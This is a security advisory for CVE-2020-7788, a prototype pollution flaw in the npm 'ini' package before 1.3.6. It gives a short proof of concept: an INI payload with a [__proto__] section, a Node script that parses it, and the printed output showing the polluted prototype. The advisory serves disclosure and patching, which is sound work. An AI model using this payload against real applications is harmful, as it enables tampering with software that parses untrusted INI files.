# [H] ini before 1.3.6 vulnerable to Prototype Pollution via ini.parse

## Summary
Severity: High
Advisory: GHSA-qqgx-2p2h-9c37
CVE: CVE-2020-7788
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2020-12-10
Source: https://github.com/advisories/GHSA-qqgx-2p2h-9c37
Type: github-advisory

## Affected
- npm: `ini` — affected >=0 <1.3.6

## Details
### Overview
The `ini` npm package before version 1.3.6 has a Prototype Pollution vulnerability.

If an attacker submits a malicious INI file to an application that parses it with `ini.parse`, they will pollute the prototype on the application. This can be exploited further depending on the context.

### Patches

This has been patched in 1.3.6.

### Steps to reproduce

payload.ini
```
[__proto__]
polluted = "polluted"
```

poc.js:
```
var fs = require('fs')
var ini = require('ini')

var parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))
console.log(parsed)
console.log(parsed.__proto__)
console.log(polluted)
```

```
> node poc.js
{}
{ polluted: 'polluted' }
{ polluted: 'polluted' }
polluted
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7788
- https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1
- https://github.com/npm/ini
- https://lists.debian.org/debian-lts-announce/2020/12/msg00032.html
- https://snyk.io/vuln/SNYK-JS-INI-1048974
- https://www.npmjs.com/advisories/1589
